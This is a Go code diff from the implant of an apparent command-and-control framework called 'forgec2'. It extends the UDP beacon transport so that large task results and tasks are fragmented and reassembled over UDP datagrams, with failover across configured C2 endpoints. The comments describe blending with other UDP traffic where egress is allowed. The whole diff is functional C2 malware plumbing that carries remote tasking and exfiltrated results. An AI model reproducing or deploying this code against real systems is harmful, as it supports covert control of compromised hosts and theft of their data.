@@ -6,19 +6,21 @@ package main
 import (
 	"fmt"
 	"net"
+	"strconv"
 	"time"
+
+	"github.com/forgec2/forgec2/pkg/protocol"
 )
 
-// sendUDPBeacon sends the (already envelope-wrapped) beacon payload as a single
-// UDP datagram to the C2 endpoint and reads one response datagram. It provides
-// a low-overhead, connectionless beacon transport for environments where UDP
-// egress is permitted (or to blend with other UDP traffic). The server must
-// expose a matching UDP listener that understands the same v2 envelope framing.
-// Every configured udp:// endpoint is tried in failover order.
+// sendUDPBeacon sends the (already envelope-wrapped) beacon payload as UDP
+// datagrams to the C2 endpoint and reads one response. Bodies larger than a
+// conservative datagram payload are split into FC2I fragments (the same
+// framing ICMP uses) and the reply is reassembled the same way, so a big result
+// or task no longer needs a connection-oriented transport.
 //
-// Fragmentation/ordering are the caller's concern: the payload is sent in one
-// datagram, so keep it within the link MTU; larger results must use a
-// connection-oriented transport.
+// Every configured udp:// endpoint is tried in failover order. Fragments of
+// one beacon all go to the endpoint that answered first only after a complete
+// response; a partial/failed exchange leaves the beacon queued for retry.
 func sendUDPBeacon(body []byte) []byte {
 	return forEachC2Endpoint("udp", func(_ int, _ string, hostPort, _ string) []byte {
 		return sendUDPBeaconAt(hostPort, body)
@@ -46,25 +48,44 @@ func sendUDPBeaconAt(hostPort string, body []byte) []byte {
 	if err := conn.SetDeadline(time.Now().Add(15 * time.Second)); err != nil {
 		return nil
 	}
-	if _, err := conn.Write(body); err != nil {
-		if Debug {
-			fmt.Printf("[!] UDP beacon: write failed: %v\n", err)
+	for _, frag := range protocol.DatagramFragSplit(body) {
+		if _, err := conn.Write(frag); err != nil {
+			if Debug {
+				fmt.Printf("[!] UDP beacon: write failed: %v\n", err)
+			}
+			return nil
 		}
-		return nil
 	}
 
+	// One connection and a single assembler per exchange: a reply is either a
+	// legacy un-fragmented envelope or a set of FC2I parts in any order.
+	asm := protocol.NewDatagramAssembler()
 	rbuf := make([]byte, 16*1024*1024)
-	n, _, err := conn.ReadFromUDP(rbuf)
-	if err != nil {
-		if Debug {
-			fmt.Printf("[!] UDP beacon: read failed: %v\n", err)
+	for {
+		n, _, err := conn.ReadFromUDP(rbuf)
+		if err != nil {
+			if Debug {
+				fmt.Printf("[!] UDP beacon: read failed: %v\n", err)
+			}
+			return nil
 		}
-		return nil
+		if n == 0 {
+			continue
+		}
+		data := rbuf[:n]
+		if protocol.DatagramMaybePlain(data) {
+			// The server answers with a raw (optionally malleable-wrapped)
+			// envelope; mirror the TCP transport and return it verbatim.
+			return data
+		}
+		msgID, total, index, payload, ok := protocol.DatagramFragParse(data)
+		if !ok {
+			continue
+		}
+		full, asmErr := asm.Add(strconv.FormatUint(uint64(msgID), 10), total, index, payload)
+		if asmErr != nil || full == nil {
+			continue
+		}
+		return full
 	}
-	if n == 0 {
-		return nil
-	}
-	// The server answers with a raw (optionally malleable-wrapped) envelope;
-	// mirror the TCP transport and return it verbatim.
-	return rbuf[:n]
 }
